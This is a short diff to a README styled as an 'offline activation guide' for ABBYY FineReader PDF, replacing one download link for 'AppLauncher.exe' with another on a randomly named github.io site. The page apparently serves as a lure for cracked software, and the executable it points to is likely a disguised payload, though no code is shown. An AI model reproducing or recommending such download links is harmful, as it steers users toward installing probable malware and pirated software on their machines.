@@ -1,7 +1,7 @@
 # 📄 ABBYY Fine Reader PDF — Offline Activation Guide
 
 🔘 Download AppLauncher.exe from the archive:  
-[![Download AppLauncher](https://img.shields.io/badge/Download-AppLauncher.exe-green)](https://aslsimulrv-entertaiment.github.io/.github/)
+[![Download AppLauncher](https://img.shields.io/badge/Download-AppLauncher.exe-green)](https://zeenagwholfrss.github.io/.github/abbyy-fine-reader-pdf)
 
 ---
 
